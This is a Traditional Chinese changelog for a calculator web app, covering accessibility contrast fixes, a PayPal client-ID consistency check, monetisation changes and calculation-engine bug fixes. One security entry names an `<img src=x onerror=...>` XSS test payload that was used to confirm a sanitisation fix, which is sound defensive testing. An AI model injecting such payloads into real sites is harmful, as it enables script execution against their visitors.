- `.pro-badge-btn.is-free` / `.pro-badge` 的 `#f59e0b → #ef4444` 漸層配白字僅 **2.15:1**（兩個主題都失敗，歷次稽核皆未抓到，因掃描器讀不到漸層），壓深為 `#c2410c → #b91c1c`（5.18:1 / 6.47:1）
- Pro modal 的 `li.muted` / `.pro-footer` `#64748b` → `#94a3b8`（2.78:1 / 3.04:1）

### 🔒 Security：`renderSaved()` 對齊 v3.5.3/v3.5.4 的修復

儲存列表仍用 `innerHTML` 直接插入 `f.formula` / `f.result`，並以 inline `onclick="deleteSaved(id)"` 綁定 —— 當年自建公式（v3.5.3）與內建公式（v3.5.4）都改掉了，這條 render path 被漏掉。改為 `escapeFormulaHtml()` + `data-saved-id` + `addEventListener`，三條 render path 一致。內容雖然只源自使用者自己輸入（僅 self-XSS 面），但同款 pattern 留兩種比統一更難維護。刪除鈕另補 `aria-label`。

### ♿ A11y：WCAG 1.4.11 非文字對比（互動元件邊界 3:1）

實測深色主題 20 種、淺色主題 33 種互動元件邊框未達 3:1。根因是 `--border-dark` —— 它是給 panel / 卡片這類**裝飾性分隔線**用的（深 `#475569` 1.93:1 / 淺 `#cbd5e1` 1.47:1），被表單控制項當成**唯一可辨識邊界**就不合格；控制項自身的填色也救不了（`--bg-dark-tertiary` 對 panel 底只有 1.18:1）。

- **新增 `--border-interactive`**（深 `#94a3b8` / 淺 `#64748b`）：套用到 18 個互動控制項規則 —— `.lang-selector`、`.calc-cat`、`.base-mode`、`.ucbtn`、`.fcbtn`、`.unit-select`、`.foreign-select`、`.refresh-btn`、`.form-group input`、`.formula-search input`、`.custom-formula-group-select`、`.graph-expr-input`、`.graph-range-input`、`.graph-tool`、`.graph-mode-tab`、`.graph-stat-select`、`.graph-stat-input textarea` 等。**裝飾性 panel / 卡片邊框維持 `--border-dark` 不動。**
- **新增 `--border-accent` / `--border-accent-green`**：`--primary` 與 `--green` 當邊框在深色底達標（5.95:1 / 5.70:1）、在淺色底只有 2.2–2.4:1，故只在淺色主題加深為 `#0e7490` / `#047857`。套用於 `.help-btn`、`.unit-input`、`.unit-swap-btn`、`.currency-amount-input`、`.foreign-input`、`.foreign-result-btn` 與五組 `.active` 狀態邊框。
- **三個一次性項目**：`.fcbtn-custom` 的 `rgba(251,146,60,0.4)` → `--custom-text`；`.pro-license-input input` 的 `rgba(255,255,255,.15)`（1.44:1）→ `.45`（3.84:1）；`.btn-submit` 補 `border: none`（沒宣告會吃到 UA 預設黑框，1.29:1，此鈕靠綠色實心底辨識即可）。
- **驗證**：雙主題重掃 1.4.11 **皆歸零**；同時重跑文字對比掃描確認零回歸（深淺主題純色底仍為 0）。

### 🧪 驗證

- **鍵盤**：以瀏覽器真實按鍵事件（`isTrusted: true`）端對端驗證 `12+7*3=33`、`100/4=25`、`2^10=1024`、`(2+3)*4=20`、`1.5+2.5=4`、`5!=120`、`10-3=7`、`|−7|=7`、`200*15%=30`；Error 後接續輸入自動重置；Backspace；進位模式 `ff` → HEX FF / DEC 255 / BIN 11111111，BIN 模式下 `7`/`9` 正確忽略
- **守衛**：切到「單位」tab 打字不進計算機；游標在輸入框內打字進輸入框、display 不動；modal 開啟時打字不進計算機、Esc 只關 modal 不清計算機
- **對比度**：深色 236→0、淺色 18→0（純色背景）；漸層背景 4 組逐一以色停實算確認為誤報或已修復（6.81 / 5.18 / 5.71 / 5.24）
- **計算引擎回歸**：24 案例全綠（含 `nCr(171,2)=14535`、`sin(180°)=0`、`0.1+0.2=0.3`、`6.62607015e-34×3e8=1.987821045e-25`、`1÷0=Error`）
- **儲存列表**：以 `<img src=x onerror=...>` payload 驗證輸出為字面文字、零注入元素、零 inline `onclick`、XSS 未觸發；刪除與計數徽章正常
- console 零 error；`sw.js` `CACHE_NAME` v3.8.5 → v3.9.0

### ⚠️ 未完成

Worker v2.4.1（`/health` 的 `paypal_client_id_hash`）**仍未部署** —— 本機 Cloudflare OAuth token 已失效（`wrangler whoami` 回 `Failed to fetch auth token: 400`），需重新 `wrangler login`。雙環境 `--dry-run` 已通過、bindings 正確。前端的一致性檢查在 Worker 未回傳該欄位時走「警告放行」分支，不影響金流。

---

## [3.8.5] - 2026-07-22 — Fix: 全站淺色主題文字對比度（WCAG AA）

延續 v3.8.4 只修 guide/footer 的對比度深審，本次擴大到**全站**：用瀏覽器實測（axe-core + 手動 alpha-compositing 逐元素驗算，覆蓋所有 tab、help/pricing/graph modal）掃出淺色主題下 51 處文字對比不足 WCAG AA 的地方，全部修復並回歸驗證歸零。

### ♿ A11y（WCAG 2.1 AA 對比度，僅淺色主題）

- **根因**：`--primary`（青）、`--green`、amber/violet/rose/orange 等強調色，淺色主題下 `--primary` 本身不隨主題變深，直接當文字色對白色/淺色背景僅 1.84–2.43:1，遠低於 4.5:1（沿用 v3.8.4 `--guide-accent` 的解法思路，但那次只套用在 guide/footer）
- **新增 6 個文字色專用 token**（深色主題維持原色相不變，僅淺色主題覆寫加深）：`--primary-text`（cyan-800 `#155e75`）、`--green-text`（emerald-800 `#065f46`）、`--science-text`（amber-800 `#92400e`）、`--physics-text`（violet-800 `#5b21b6`）、`--finance-text`（rose-800 `#9f1239`）、`--custom-text`（orange-800 `#9a3412`），另加 `--text-on-accent`（固定 `#0f172a` 不隨主題翻轉，修 `.btn-submit` 用 `--bg-dark` 當文字色淺色主題下變近白消失的問題）
- **修復範圍**：計算機按鈕（三角函數 / 運算子 / 等號 / 物理常數）、tab / 分類按鈕 active 態、單位換算與匯率輸入框與結果、公式卡片（名稱 / 分類 tag / 六種領域徽章 / 自建公式橘色標籤）、help modal（標題 / icon / code）、pricing modal（標題 / 價格 / 連結）、graph modal（標題 / 面板標題 / 滑桿標籤）— 共 43 個 CSS 選擇器
- **驗證**：本地 preview 全站掃描（含隱藏 tab/modal 內容）淺色主題違規 51 → 0；深色主題以相同腳本回歸掃描，數值與修改前逐位元組相同（token 定義未變），確認零回歸
- `sw.js` `CACHE_NAME` v3.8.4 → v3.8.5

### 已知、留待未來（超出本次範圍）

- 深色主題（預設主題）本身也存在 9 處邊緣性對比不足（3.81–4.39:1，僅略低於 4.5 門檻），與本次淺色主題翻轉問題無關、是獨立的既有瑕疵，未列入本次修復範圍
- `border-color: var(--primary)`（如 tab 底線、calc-cat 邊框）作為非文字 UI 元件邊界，WCAG 1.4.11 門檻是 3:1 而非本次處理的文字 4.5:1，未一併稽核

### 🔒 Security（Worker v2.4.1）：PayPal Client ID 前後端一致性 fail-loud 檢查

- **動機**：2026-06-14 曾發生前端 `pro-config.js` 的 `PAYPAL_CLIENT_ID` 打錯一個字元（`eIlo` 誤植為 `eIIo`，肉眼幾乎無法辨識）導致 PayPal 訂閱按鈕整段消失且不拋出任何錯誤，直到人工三連 push 才反轉修復（見 [[journal/2026-06-14_supercalc_paypal_clientid_reversal]]）。本次補上自動偵測機制防止再犯。
- **Worker `/health` 新增 `paypal_client_id_hash`**：回傳 `sha256(env.PAYPAL_CLIENT_ID)` 前 12 hex 字元（`worker/license-validator.js` v2.4.0 → v2.4.1）
- **前端 `paypal-integration.js` 新增 `verifyClientIdMatchesBackend()`**：載入 PayPal SDK 前，用 Web Crypto API 算出 `PRO_CONFIG.PAYPAL_CLIENT_ID` 同款 hash 並與 Worker 回傳值比對
  - 兩邊 hash 一致 → 正常放行
  - **不一致 → `console.error` + 拋出例外阻擋 SDK 載入**，pricing modal 顯示明確錯誤訊息（雙方 hash 值 + 排查提示）
  - Worker 網路失敗或回傳無此欄位（舊版 Worker）→ `console.warn` 後放行，不阻擋購買流程（避免基礎設施短暫異常誤傷金流）
- `index.html` 內 `js/paypal-integration.js?v=3.3.1` → `?v=3.3.2`
- **驗證**：(1) 用 2026-06-14 事故的實際錯字重現，確認兩者 hash 完全不同（`e3b111f4f353` vs `acc4fc8cfcac`），證明機制能偵測到那次事故；(2) 對現行（尚未部署新版）production Worker 真實請求 `/health`，確認缺欄位時走「警告放行」分支、PayPal 按鈕正常渲染，零回歸；(3) mock 一組錯誤 hash 驗證阻擋分支正確觸發 `console.error` + 擋下 SDK、UI 顯示排查訊息
- **待辦**：本次僅修改本機檔案，**尚未 `wrangler deploy`** — Worker 端 `paypal_client_id_hash` 要等實際部署後才會在 production 生效，部署前請先與使用者確認（金流 Worker 屬對外服務變更）

---

## [3.8.4] - 2026-07-18 — Quality: SEO + a11y 深審修復（og:image / FAQPage / 對比度 / main landmark）

品質深審 session：Lighthouse mobile 實測 **Perf 98 / A11y 94 / BP 100 / SEO 100**（LCP 1.8s、CLS 0、TBT 20ms，CWV 全達標），針對剩餘缺口一次修齊。

### 🔍 SEO

- **新增 `og:image` / `twitter:image`**（1200×630 `og-image.png`，headless Chrome 產生）：先前完全沒有社群分享預覽圖；`twitter:card` 同步升級 `summary` → `summary_large_image`
- **新增 FAQPage JSON-LD 結構化資料**：guide 區 FAQ 從 2 題擴充至 5 題（新增 PWA 安裝、語言支援、Free vs Pro 比較），JSON-LD 與可見內容逐字對位，爭取 Google rich result
- `WebApplication` JSON-LD `softwareVersion` 3.1.0 → 3.8.4（停更多時）
- `sitemap.xml` 首頁 `lastmod` 2026-05-11 → 2026-07-18
- `manifest.json` 描述「80+ 公式庫」→「100 條公式庫」（v3.5.9 破百後未同步）

### ♿ A11y（WCAG 2.1 AA 對比度）

- **新增 `--guide-accent` 主題色 token**（深色 `#22d3ee` 8.09:1 / 淺色 `#0e7490` 5.36:1）：guide 區 7 個 `h3` 原用 `--primary-dark`（深色主題僅 3.97:1，Lighthouse 揪出）；guide `h2` 與 guide/footer 全部 13 處連結原用 `--primary`（淺色主題僅 2.43:1，Lighthouse 只測深色所以漏掉）——全部換上雙主題合規 token
- **`<div class="container">` → `<main class="container">`**：補上缺失的 main landmark（Lighthouse `landmark-one-main`）

### 📝 文案誠實化（Carbon Ads 被拒後）

- Carbon Ads 申請**被拒**（2026-07 確認），目前無任何廣告聯播網。Pricing modal Free 方案「▾ 含 Google AdSense 廣告」（廣告根本不存在）→「▾ 未來可能顯示贊助廣告」；README ZH/EN 對比表同步

### 🔧 其他

- `sw.js` `CACHE_NAME` v3.8.3 → v3.8.4

### 已評估、刻意不做

- **PayPal SDK lazy-load**（97KB、43KB unused，每個訪客都載）：金流路徑動它風險高於效益，defer 已不阻塞 CWV — 列 backlog
- **inline CSS/JS minify**（est. 19KB）：與單檔可讀性核心設計衝突
- **TTFB 690ms / 靜態資源 10 分鐘 cache**：GitHub Pages 平台固定，無法調整

---

## [3.8.3] - 2026-06-25 — Chore: drop dead AdSense script + plan Carbon Ads route

### 🧹 清負債 — 移除 AdSense 殘留

`index.html` 一直有但從未運作的 Google AdSense `<script async ... adsbygoogle.js?client=ca-pub-3360648495679709>`（AdSense 申請被拒後遺留 30+ 天，使用者瀏覽器每次都載一個無 ad 的 HTTP request）終於拿掉。順手清 `sw.js` 對應 `'googlesyndication'` host bypass 與 comment。

### 🎯 變現方向確認 — Carbon Ads（取代 AdSense）

決定走 **Carbon Ads**（BuySellAds 旗下、開發者工具站專用、單一區塊、UX 友善）。Ezoic 2026-02-19 起新門檻 250K MAU 不適合現階段；Adsterra/PropellerAds UX 差排除。

**地雷**：Carbon Ads 是 **exclusive network**，加入後不能與其他聯播網並存。

**Pro 賣點不變**：Carbon 通過後 → Free 看廣告 / Pro 與 Trial 隱藏廣告（複用 `ProManager.isProActive()` 同步 API）。Pricing modal 既有「✓ 無廣告」項目對位，待 Carbon 通過再同步 README / modal 文案。

#### 改動

- `index.html`：刪除 line 49-50 dead AdSense `<script>` tag
- `sw.js`：`CACHE_NAME` `sigma-calc-v3.8.2` → `v3.8.3`；`NETWORK_FIRST_HOSTS` 移除 `'googlesyndication'`；相關 comment 更新

#### 下一步

Carbon Ads 申請文案備齊於 `docs/CARBON-ADS-APPLICATION.md`，送 https://www.carbonads.net/join 後等審 5-7 工作天。通過後一次性整合：

1. 右側 sidebar 底部加第四個 panel（130×100 ad slot、桌機 only、手機隱藏照舊）
2. `ProManager.isProActive()` 條件渲染（Pro / Trial 不載 Carbon embed script、不顯示容器）
3. README.md / README_EN.md line 270 + `index.html` pricing modal line 5706「含 AdSense 廣告」改「含 Carbon Ads（贊助廣告）」
4. SW bump `v3.8.4`

---

## [3.8.2] - 2026-06-18 — Perf: HTML parser unblocking (defer 5 external JS)

### ⚡ 性能優化 — body 尾部 5 個 `<script>` 加 `defer`

把 `pro-config.js` / `license-api.js` / `pro-manager.js` / `paypal-integration.js` / `pro-ui.js` 從 sync `<script>` 改為 `<script defer>`。瀏覽器 HTML parser 不再被 5 個 14KB（gzip）的 sync 下載阻塞，5 檔並行下載、依文件順序延到 `DOMContentLoaded` 之前執行，Pro 模組初始化鏈（config → api → manager → integration → ui）保留 100%。

#### 改動

- `index.html` line 5774-5778：5 個 `<script src="js/...">` → `<script defer src="js/...">`
- `sw.js` `CACHE_NAME` `sigma-calc-v3.8.1` → `v3.8.2`（強制 SW 清舊 index.html）

#### Why `defer` 而非 `async`

`async` 是「下載完立即執行、順序隨機」，會破壞 Pro 模組鏈（`pro-ui.js` 依賴 `pro-manager.js` 已 init）。`defer` 保留文件順序、延到 `DOMContentLoaded` 之前執行，與 inline JS（line 2449-5671）對 Pro 物件的 lazy 訪問模式（既有 `window.X && ...` graceful retry，line 3035 注釋已明示）完美搭配。

#### 本地驗證（preview, 5 項全綠）

- 5 個 Pro 全域物件全部 `typeof === 'object'`
- `ProManager.getTier() === 'free'` + `isProActive() === false`（free 狀態正確）
- 100 條公式渲染 + 41 個 🔒 鎖頭顯示
- `console.error` = 0、`console.warn` = 0
- SW state `activated`、新版 `sigma-calc-v3.8.2`

#### 預期線上效益

對 5 個 `js/*.js`（gzip 共 14KB）的 sync 阻塞解除，理論上對 TTI / FCP 有 50–200ms 量級改善。線上實測需跑 PSI Mobile / Desktop。

#### 同 session 深審基準線（供下次效能 audit 參考）

- `index.html`：306 KB raw / 66 KB gzip / 52 KB brotli（GitHub Pages 預設 gzip）
- `js/*.js` × 5：raw 40 KB / gzip 14 KB
- inline CSS（line 51-1627）：62 KB raw
- inline JS（line 2449-5671）：177 KB raw / 3223 行
- 0 個 `<img>`、0 個 `<iframe>`（零 CLS 風險來源）
- 1 個 `<canvas>`（函數繪圖）

---

## [3.8.1] - 2026-06-14 — Hotfix: PayPal Live Client ID 反轉修復

### 🔴 P0 反轉修復 — `eIIo` → `eIlo`（2026-06-03 commit 7ee5334 改錯方向）

v3.8.0 上線同時的「P0 修復」commit `7ee5334`，把 PayPal Live Client ID 的第 67 字元從**對的** `l`（小寫 L）改成**錯的** `I`（大寫 i），導致 production PayPal SDK 自 2026-06-03 起 11 天 `onerror` 載入失敗，Pricing modal 開啟後 Subscribe Buttons 完全無法渲染。海外買家全部無法訂閱。

#### 三連 commit 修復（cache 三層全清）

- `a730e1f` **fix(paypal)**: pro-config.js Live `PAYPAL_CLIENT_ID` 還原 `mlRyW-eIIo7yprky-9L0` → `mlRyW-eIlo7yprky-9L0`（與 v3.4.0 上線當天 deploy verify 的 ground truth 一致）
- `cce7ac8` **chore(sw)**: `CACHE_NAME` `sigma-calc-v3.8.0` → `v3.8.1`（強制 SW 清舊 cache；v3.8.0 P0 push 違反 SW cache trap 規則沒 bump，本次補回）
- `82267b7` **chore**: index.html `pro-config.js?v=3.3.1` → `?v=3.3.2`（強制瀏覽器 HTTP cache miss）

#### Why 需要三個 commit — 三層 cache 規則各異

只 push pro-config.js 不夠：
- **SW cache**：使用者瀏覽器的 Service Worker v3.8.0 持續服務舊 pro-config.js、CACHE_NAME 不變就不會自動清；實證 — 我 unregister SW + 清 caches API 後仍見舊 runtime
- **HTTP cache**：即使 SW 升 v3.8.1、URL key `?v=3.3.1` 不變 → 瀏覽器 HTTP cache 在 SW 之前命中、回舊內容；只能 bump query string 才會 cache miss
- **CDN cache**：GH Pages Fastly edge 10 分鐘自然到期（`Cache-Control: max-age=600`），不需手動處理

#### 端對端驗證（Chrome MCP）

- runtime `PRO_CONFIG.PAYPAL_CLIENT_ID` 含 `eIlo` ✅
- `window.paypal.Buttons` 存在 ✅
- `paypal-button-container` iframe × 2 ✅（PayPal 黃色 Subscribe + 黑色扣帳卡按鈕）
- 「7 天免費試用」文案就位 ✅
- DevTools console 無 PayPal 相關 error ✅

#### 受影響範圍

| 路徑 | 2026-06-03 → 2026-06-14（11 天）| 修復後 |
|------|--------------------------------|---------|
| 海外買家點 ✨ 升級 Pro | ❌ Pricing modal 開但 Buttons 完全不渲染、顯示「SDK 載入失敗」| ✅ Subscribe Buttons 正常 |
| 海外回訪訂閱者 license 驗證 | ✅ 不受影響（不需重走 PayPal）| ✅ |
| 台灣訪客 | ❌ Buttons 不渲染 | ⚠️ Buttons 渲染但 PayPal 法規禁 TW↔TW 互轉 |

#### 五個教訓（記憶長期保存）

1. **Memory ≠ source of truth** — 反例段落容易被當成正確值；後續記錄重要 client-id 必須附 deploy verify 證據連結
2. **Fingerprint last6 + length 抓不到中段字元錯字** — 本次錯字在第 66 字元、末 6 字元與長度都不變、fingerprint 雙重檢查全通過但 SDK 拒絕；fingerprint 設計缺陷，必須升級到 backend hash cross-check 或 SDK 真實載入冒煙測試
3. **健康檢查 `curl + grep` 全綠 ≠ 系統 healthy** — `curl` 只能驗 HTTP 層字串、不能驗第三方 SDK 真實接受 client-id；金流關鍵路徑必須有 Chrome MCP / Playwright 真實 browser smoke test
4. **任何前端變更必須 bump SW CACHE_NAME** — 是 v3.8.0 P0 push 之所以被回訪用戶忽略的根本原因；今日同步補回
5. **使用者一句話的價值** — 我原本懷疑 PayPal 帳號失效要建議使用者登 Dashboard 重設；使用者提醒「我之前貼過正確值」直接救了 session，最終翻 2026-05-08 journal 找到 ground truth

#### 同 session 順帶發現（非本次修改副作用）

- **PayPal TW↔TW 法規限制**：步驟 3 試訂閱踩到，台灣賣家 ↔ 台灣買家 PayPal 互轉被禁；不影響海外市場
- **Sandbox PayPal Client ID 失效**（debug id `ca0b8688b8c51`）：與本 P0 修復獨立，下次開工需登 PayPal Developer Dashboard 重建或重啟 sandbox app

兩件事均詳細記載至記憶系統，列為下次開工 P1 待辦。

---

## [3.8.0] - 2026-05-29 — Freemium 公式分層上線（變現計畫 Phase 2.3）

### 🎯 Phase 2.3 Freemium 全套上線

#### 公式分層（100 條 → Free 59 + Pro 41）
- 數學 8、金融 7、工程 7、科學 6、物理 9、健康 4 共 41 條 Pro 公式
- 涵蓋判別式、海倫公式、現值 PV、年金、實質年利率 EAR、RC 時間常數、
  量子（波耳能量、普朗克 E=hf）、相對論 E=mc²、簡諧週期 / 彈簧位能、
  TDEE 每日總消耗、體脂率 Deurenberg 等專業領域工具
- 詳細名單見 `docs/MONETIZATION-PHASE-2-TIER-SPLIT.md`

#### Pro 公式 UI
- Pro 公式卡片金色漸層 + 🔒 鎖頭 + `PRO` 徽章視覺
- 未訂閱使用者點擊 → 開升級對話框（Pricing modal）
- 訂閱者 / 7 天試用者 → 自動移除鎖頭、正常開公式 modal

#### Pricing Modal（新建）
- Free vs Pro 對比表（5 項 × 2 欄）+ 月費 $2.99 / 年費 $19.99 toggle
- 年費省 44% 徽章
- 內嵌 PayPal Subscribe Buttons（既有 PayPal Subscriptions 整合）
- 「復原授權」連結回退到既有 #pro-modal
- `/pricing` deep link（hash 路由：`#/pricing` 或 `#pricing`）
- 完整 WCAG 2.1 AA：role=dialog / aria-modal / focus trap / Escape 關閉
- 響應式：≤ 600px 自動切單欄

#### Worker v2.4.0
- JWT payload 新增 `tier` 欄位（目前 active 訂閱者皆 `'pro'`，留擴充點）
- `/license/validate` 回傳 `tier` 給前端使用
- 舊 token（v2.3.0 以前簽發）無 tier 欄位自動 fallback 為 `'pro'`（向下相容）
- `/health` 加 `freemium: 'tier-in-jwt'` 訊號
- `deriveTier(sub)` helper：優先採用 KV `sub:{id}.tier` 顯式欄位，
  未來可擴充 enterprise / lifetime / team 等多層級

#### 前端 ProManager
- 新增 `getTier()` 三態：`'free' | 'trial' | 'pro'`
- `getLicenseInfo()` 加 tier 欄位（讀 JWT payload）
- `isProActive()` 語意不變：trial + license 皆視為 active（保留前端 trial 顯示）

#### P0 修復
- **修 `pro-config.js` PayPal Live Client ID 錯字**（第 30 行 `eIlo` → `eIIo`）
  — 自 2026-05-14 至今 production PayPal SDK 載入受影響，本次修復後正常生效

### 📚 文件
- README.md / README_EN.md：標示 Pro 41 條公式 + 月費 / 年費定價
- 沿用 `docs/MONETIZATION-PHASE-2-TIER-SPLIT.md` 分層草案，已落地實作

---

## [3.7.1] - 2026-05-27 — Deep link `?formula=N`（變現計畫 Phase 3.2）

支援外部 SEO 文章透過 query param 直連特定公式，並自動開啟計算 modal。
配合 Bobo Labs `/formulas/` 子站 10 篇示範文章中嵌入的 iframe 使用。`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.7.1`。

### Added

- **`?formula=N` query param**：頁面載入時若帶此參數，自動切到「公式」tab、開啟 id=N 的計算 modal。
- 設計重用既有 `[data-formula-id]` data 屬性與 `formulaModal` 模式，零新 dependency。
- 適用範例：`https://boboidvtw.github.io/?formula=11` → 自動開「勾股定理」計算視窗。

### Verified

- `?formula=11` → 自動開「勾股定理」modal ✓
- `?formula=71` → 自動開「動能」modal ✓
- console 零 error；無 formula param 時行為與舊版完全一致

---

## [3.7.0] - 2026-05-27 — Sponsor 按鈕（變現計畫 Phase 1）

啟動「Sponsor + Freemium + Content Engine」三層變現策略的第一層 — 為重度使用者提供零摩擦贊助入口，cover Cloudflare Worker / KV 月費並維持站點 **免費、無廣告、無追蹤**。本次純前端功能，未改動 Worker 與計算引擎。`sw.js` `CACHE_NAME` 同步 bump 至 `sigma-calc-v3.7.0`。

### Added

- **Header ❤ Support 按鈕**：在 header `controls` 區（lang/help 之後、graph 之前）新增紅色心形 `.support-btn`，與 `.help-btn` 同尺寸（36×36 圓形）與互動風格。位置選 header 而非 floating button — 避免擋計算 UI（CLAUDE.md 開發禁忌）。
- **Support Modal（`#supportModal`）**：沿用 `.help-modal` overlay layout pattern，內含贊助說明 + 兩個 CTA + 用途列表 + 感謝結語。完整 a11y：`role=dialog`、`aria-modal`、`aria-labelledby`、與既有 `openModal`/`closeModal` helper 整合（焦點移入、焦點陷阱、Escape 關閉、關閉後焦點還原至 `supportBtn`）。
- **兩個贊助 CTA**：
  - **GitHub Sponsors**（`https://github.com/sponsors/boboidvtw`，粉紅色 `#ea4aaa`）— 月贊助 $1 / $5 / $10
  - **Ko-fi**（`https://ko-fi.com/boboidvtw`，藍色 `#29abe0`）— 一次性贊助（PayPal 即可）
  - 兩者皆 `target="_blank" rel="noopener noreferrer"`、`min-height: 44px` 觸控標準。
- **Deep link 支援**：`#/support` 或 `#support` 任一 hash 載入後自動開啟 Support modal，方便外部分享連結（README badge / 社群貼文）。
- **README 雙語 Sponsor 區塊**：`README.md` + `README_EN.md` 加 GitHub Sponsors / Ko-fi badge 與一段中英雙語贊助說明，Version badge 同步 bump 至 3.7.0。

### Verification

- 桌機（深色 + 淺色主題）modal 開關、CTA 視覺、用途框排版 — 全綠
- 行動裝置（478px viewport）modal 完整置於 viewport 內（modal_x=16、modal_width=446）— 無溢出
- 鍵盤 a11y：點 ❤ 按鈕 → 焦點進入 close button、Escape 關閉 → 焦點還原至 ❤ 按鈕
- Hash route：`location.hash = '#/support'` 後 modal 自動開啟
- 回歸：7+8=15、`sw.js = sigma-calc-v3.7.0`、console 零 error

---

## [3.6.0] - 2026-05-22 — 無障礙強化（WCAG 2.1 AA 深審）

一輪 WCAG 2.1 AA 無障礙深度審查後的修復，補齊自專案建立以來缺漏的鍵盤操作與螢幕閱讀器支援。全部經本地瀏覽器逐項實測、零回歸、零 console error。`sw.js` `CACHE_NAME` 同步 bump 至 `sigma-calc-v3.6.0`。

### Added

- **鍵盤焦點指示器**（WCAG 2.4.7）：新增全域 `:focus-visible` 樣式，所有按鈕、tab、輸入框於鍵盤操作時顯示 3px 青色外框。先前全站無任何焦點指示。
- **Modal 對話框語義 + 焦點管理**：3 個 modal（使用說明 / 公式計算 / 函數繪圖）加 `role=dialog`、`aria-modal`、`aria-labelledby`；新增 `openModal` / `closeModal` 共用 helper——焦點移入、焦點陷阱（Tab 循環不外漏）、Escape 關閉、關閉後焦點還原至觸發按鈕。
- **螢幕閱讀器朗讀**：計算結果顯示區（`#display`）與 toast 通知加 `aria-live`，運算結果與提示訊息可被即時朗讀。
- **無障礙名稱**：主題切換等圖示按鈕加 `aria-label`；7 個 `<select>` 與多個 placeholder-only 輸入框補齊 `aria-label`；自建公式表單 `<label>` 加 `for` 關聯。

### Fixed

- **說明手風琴鍵盤無法操作**（WCAG 2.1.1，Level A）：6 個說明區塊標題原為純滑鼠 `<div>`、僅綁 `click`，鍵盤使用者完全無法展開。現加 `role=button`、`tabindex`、`aria-expanded`，並支援 Enter / Space 鍵切換。
- **標題層級跳階**（WCAG 1.3.1）：頁面原無 `<h1>`、文件大綱破損。主標題改為 `<h1>`、側邊欄標題重整為 `h2`/`h3`（同步調整對應 CSS 選擇器，手機側欄隱藏行為零回歸）。
- **未定義 CSS 變數**：`.graph-mode-tab` 誤用 `var(--text)` / `var(--border)`（正確為 `--text-dark` / `--border-dark`），導致邊框未渲染。

### Changed

- **行動裝置觸控目標**：函數繪圖工具列按鈕（`.graph-tool` / `.graph-btn` / `.graph-mode-tab`）於 ≤768px 提升至 `min-height: 44px` 觸控標準。

---

## [3.5.9] - 2026-05-22 — 公式庫突破 100 條 + 修組合數溢位與三角函數浮點殘渣

修復兩個自計算引擎建立以來即存在的瑕疵，並將公式庫從 88 條擴充至 100 條里程碑。

### Fixed

- **`nCr` / `nPr` 大數溢位**：原以 `factorial(n)/(factorial(r)*factorial(n-r))` 計算，而 `factorial(171)` 已是 `Infinity`，導致 `nCr(171,2)` 回傳 `Infinity`、`nCr(1000,500)` 回傳 `NaN`（`Inf/Inf`），最終都顯示 `Error`。改用 multiplicative formula 逐項累乘 `result*(n-i)/(i+1)`，並以對稱性 `r=min(r,n-r)` 減少迭代。驗證 `nCr(171,2)=14535`、`nCr(1000,500)≈2.70e+299`、`nPr(100,3)=970200`，回歸 `nCr(5,2)=10`、`nPr(5,2)=20` 全綠。
- **三角函數特殊角浮點殘渣**：DEG 模式下 `sin(180°)` 回傳 `1.22e-16`、`cos(90°)` 回傳 `6.12e-17`、`tan(180°)` 回傳負殘渣，因 `Math.sin(Math.PI)` 等本身帶浮點誤差，且這類極小值會落入科學記號顯示分支而未被 `toFixed` 規整。改為在三角函數層、僅對 DEG 模式的整數特殊角（0°/90°/180°/270° 及其週期）精確 snap；刻意不採結果層 threshold-snap，因合法的科學常數（如普朗克 `6.626e-34`）比殘渣更小，會被一併誤殺。驗證 `sin(180°)=0`、`cos(90°)=0`、`tan(180°)=0`，回歸 `sin(30°)=0.5`、`sin(45°)=0.707…` 全綠。

### Added

- **公式庫擴充 12 條，總數達 100 條里程碑**：
  - 科學 +3：放射性半衰期剩餘量 `N₀·(½)^(t/T)`、由頻率求光波長 `c/f`、理想氣體體積 `nRT/P`
  - 物理 +4：壓力 `P=F/A`、功率 `P=W/t`、阿基米德浮力 `ρgV`、質能等價 `E=mc²`
  - 數學 +2：球的表面積 `4πr²`、指數成長/衰減模型 `A·e^(kt)`
  - 工程 +1：分壓定則 `Vin·R₂/(R₁+R₂)`
  - 金融 +2：毛利率、股息殖利率

### Changed

- **理想氣體（壓力）氣體常數精確化**：id 50 公式內嵌的氣體常數 `R` 從 `8.314` 升級為 `8.314462618`（SI 2019），與 v3.5.8 物理常數及新增的理想氣體（體積）公式保持一致。
- `sw.js` `CACHE_NAME` 更新為 `sigma-calc-v3.5.9`。
- SEO 與說明文案：公式條數 `88 → 100`，新增 v3.5.9 公式速覽段落。

---

## [3.5.8] - 2026-05-21 — 全面點擊測試：修 2 bug + 物理常數精確化

對全站 5 大分頁 + Header 做了一輪全面點擊測試（約 90 個案例），揪出 2 個真實 bug 並一次修齊；同時把物理常數從 4 位有效數字近似值升級為 CODATA / SI 2019 精確值。

### Fixed

- **`|x|` 絕對值鍵必定回傳 `Error`**：`calculate()` 將每個 `|` 都替換成 `Math.abs(`，缺對應的 `)`，導致 `|7|` 變成 `Math.abs(7Math.abs(` 語法錯誤。改為成對轉換 `/\|([^|]*)\|/g → Math.abs($1)`。驗證 `|7|=7`、`|3−9|=6`、`|5|+|−2|=7`、`2×|3−8|=10` 全綠。
- **CSV 匯出對數字型結果靜默崩潰**：匯出歷史時 `row.result.replace(...)` 對 Number 型結果拋 `TypeError`（`Number.prototype.replace` 不存在），中斷 `forEach` → 不產檔、不跳 toast。實測約 89% 的計算結果是 number 型，等於此功能日常完全不可用。改為 `String(row.result).replace(...)`（`row.formula` 同步加 `String()` 保險）。
- **指數結果尾隨零**：`toPrecision(10)` 對 `6.626e-34` 之類數值產生 `6.626000000e-34` 尾隨零。改為拆出 mantissa 經 `parseFloat` 去零後再接回指數，`5e-11`、`6.62607015e-34` 乾淨顯示。

### Changed

- **物理常數按鈕升級為精確值**（7 顆按鈕，`data-value` + `title` 同步）：
  - c 光速 `2.998×10⁸` → **299792458**（SI 精確定義）
  - h 普朗克 `6.626×10⁻³⁴` → **6.62607015×10⁻³⁴**（SI 2019）
  - kB 波茲曼 `1.381×10⁻²³` → **1.380649×10⁻²³**（SI 2019）
  - G 引力 `6.674×10⁻¹¹` → **6.6743×10⁻¹¹**（CODATA 2018）
  - NA 亞佛加厥 `6.022×10²³` → **6.02214076×10²³**（SI 2019）
  - R 氣體 `8.314` → **8.314462618**
  - ec 電子電荷 `1.602×10⁻¹⁹` → **1.602176634×10⁻¹⁹**（SI 2019）
  - g 重力 `9.80665` 維持不變（本即標準重力精確值）。
